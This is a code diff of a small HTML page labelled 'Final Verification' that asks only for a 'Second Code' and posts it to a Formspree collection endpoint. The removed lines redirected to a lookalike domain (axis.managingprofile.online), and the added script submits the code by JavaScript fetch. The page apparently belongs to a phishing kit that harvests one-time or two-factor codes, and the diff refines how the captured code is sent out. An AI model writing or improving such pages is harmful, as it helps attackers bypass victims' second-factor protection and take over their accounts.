@@ -7,12 +7,34 @@
 <body>
   <div class="container">
     <h2>Final Verification</h2>
-    <form action="https://formspree.io/f/mnnvnwap" method="POST">
+    <form id="form">
       <label>Second Code: *</label><br><input type="text" name="code2" required><br>
-
-      <input type="hidden" name="_redirect" value="https://axis.managingprofile.online/thankyou.html">
       <input type="submit" value="Finish">
     </form>
   </div>
+
+<script>
+  document.getElementById('form').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const formData = new FormData(this);
+    fetch("https://formspree.io/f/mnnvnwap", {
+      method: "POST",
+      body: formData,
+      headers: {
+        'Accept': 'application/json'
+      }
+    }).then(response => {
+      if (response.ok) {
+        window.location.href = "thankyou.html";
+      } else {
+        alert("Form submission failed. Please try again.");
+      }
+    }).catch(error => {
+      console.error("Error submitting form:", error);
+      alert("An error occurred. Please try again.");
+    });
+  });
+</script>
+
 </body>
 </html>
